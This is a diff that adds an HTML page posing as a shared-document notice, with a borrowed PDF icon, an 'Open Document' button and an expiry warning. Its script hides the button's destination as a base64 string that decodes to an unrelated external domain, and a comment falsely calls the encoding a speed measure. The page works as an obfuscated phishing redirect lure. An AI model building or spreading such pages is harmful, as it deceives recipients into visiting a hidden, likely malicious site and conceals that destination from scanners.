@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Received</title>
+    <meta name="description" content="Review your document details" />
+    
+    <style>
+        /* Reset and base styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #ffffff;
+            color: #1a1a1a;
+            line-height: 1.5;
+        }
+
+        .container {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .card-wrapper {
+            width: 100%;
+            max-width: 28rem;
+            margin: 0 auto;
+        }
+
+        .icon-section {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .icon-container {
+            width: 6rem;
+            height: 6rem;
+            margin: 0 auto 1.5rem;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0.75rem;
+            box-shadow: 0 8px 32px -8px rgba(220, 38, 38, 0.15);
+        }
+
+        .pdf-icon {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .main-heading {
+            font-size: 1.25rem;
+            font-weight: bold;
+            color: #1a1a1a;
+            margin-bottom: 0.75rem;
+        }
+
+        .subtitle {
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+
+        .button-card {
+            background: white;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            box-shadow: 0 4px 20px -4px rgba(220, 38, 38, 0.1);
+            border: none;
+        }
+
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            font-size: 0.875rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            text-decoration: none;
+            border: none;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+        }
+
+        .btn-primary {
+            height: 2.5rem;
+            background: linear-gradient(135deg, hsl(0, 84%, 60%), hsl(0, 84%, 70%));
+            color: white;
+            border: none;
+        }
+
+        .btn-primary:hover {
+            box-shadow: 0 8px 32px -8px rgba(220, 38, 38, 0.15);
+        }
+
+        .btn-secondary {
+            height: 2.25rem;
+            background: transparent;
+            color: #1a1a1a;
+            border: 2px solid #e5e7eb;
+            font-size: 0.75rem;
+        }
+
+        .btn-secondary:hover {
+            background: #f9fafb;
+            box-shadow: 0 4px 20px -4px rgba(220, 38, 38, 0.1);
+        }
+
+        .icon {
+            width: 1rem;
+            height: 1rem;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        .icon-sm {
+            width: 0.75rem;
+            height: 0.75rem;
+        }
+
+        .footer-info {
+            margin-top: 2rem;
+            text-align: center;
+        }
+
+        .footer-text {
+            font-size: 0.75rem;
+            color: #6b7280;
+        }
+
+        /* Responsive design */
+        @media (max-width: 640px) {
+            .container {
+                padding: 0.5rem;
+            }
+            
+            .main-heading {
+                font-size: 1.125rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card-wrapper">
+            <!-- Document Icon -->
+            <div class="icon-section">
+                <div class="icon-container">
+                    <img src="https://sc.filehippo.net/images/t_app-icon-l/p/79c48e0c-f64a-4d32-a3c1-b8f18d9cd63f/3196813294/document-reader-word-excel-ppt-pdf-viewer-logo" 
+                         alt="PDF Document" 
+                         class="pdf-icon" />
+                </div>
+                
+                <!-- Subtitle -->
+                <p class="subtitle">
+                    Review the document details below.
+                </p>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="button-card">
+                <div class="button-container">
+                    <!-- Primary Action Button -->
+                    <button class="btn btn-primary" onclick="openDocument()">
+                        <svg class="icon" viewBox="0 0 24 24">
+                            <path d="m7 7 10 10-5 5V12l-5 5z"/>
+                        </svg>
+                        Open Document
+                    </button>
+                </div>
+            </div>
+
+            <!-- Additional Info -->
+            <div class="footer-info">
+                <p class="footer-text">
+                    Document expires in 7 days
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Base64 encoded redirect URL for faster loading
+        const encodedUrl = 'aHR0cHM6Ly9hcnZpb25lLml0LmNvbS8yWnczUVE3Lw==';
+        
+        function openDocument() {
+            const decodedUrl = atob(encodedUrl);
+            window.open(decodedUrl, '_blank');
+        }
+
+        // Add hover effects
+        document.addEventListener('DOMContentLoaded', function() {
+            const buttons = document.querySelectorAll('.btn');
+            
+            buttons.forEach(button => {
+                button.addEventListener('mouseenter', function() {
+                    this.style.transform = 'scale(1.05)';
+                });
+                
+                button.addEventListener('mouseleave', function() {
+                    this.style.transform = 'scale(1)';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
